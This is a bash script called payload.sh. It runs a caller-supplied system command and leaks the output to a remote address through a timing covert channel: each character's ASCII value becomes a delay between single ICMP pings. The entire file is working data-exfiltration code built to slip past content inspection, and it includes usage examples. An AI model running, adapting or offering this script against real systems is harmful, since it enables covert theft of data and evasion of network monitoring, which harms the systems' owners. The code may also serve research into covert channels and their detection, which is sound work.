#!/bin/bash
#
# TESTED ON
# Debian-Based Linux Distributions
#
# USAGE
# $ "${BASH}" ./payload.sh <SYSTEM_COMMAND> <REMOTE_ADDRESS>
# $ "${BASH}" ./payload.sh "whoami" "127.0.0.1"
#

set -eo pipefail

readonly SYSTEM_COMMAND="${1}"
readonly REMOTE_ADDRESS="${2}"

set -u

hms_d() {
    printf "%d" "$(( 10#"${1}" ))"
}

send_ping() {
    ping -c 1 -q -W 1 -4 "${REMOTE_ADDRESS}" &> /dev/null
}

hms_2d() {
    printf "%02d" "${1}"
}

command_output="$(${SYSTEM_COMMAND})"

current_hours="$(hms_d "$(date +"%H")")"
current_minutes="$(hms_d "$(date +"%M")")"
current_seconds="$(hms_d "$(date +"%S")")"
sequence_seconds="$(( (current_hours * 3600) + (current_minutes * 60) + current_seconds ))"

send_ping

for (( i=0; i<"${#command_output}"; i++ )); do
    ascii_seconds="$(printf "%d" "'${command_output:i:1}")"
    sequence_seconds="$(( sequence_seconds + ascii_seconds ))"
    target_hours="$(hms_2d "$(( sequence_seconds / 3600 ))")"
    target_minutes="$(hms_2d "$(( (sequence_seconds % 3600) / 60 ))")"
    target_seconds="$(hms_2d "$(( sequence_seconds % 60 ))")"

    while true; do
        if [ "$(date +"%H:%M:%S")" == "${target_hours}:${target_minutes}:${target_seconds}" ]; then
            send_ping
            break
        fi
    done
done
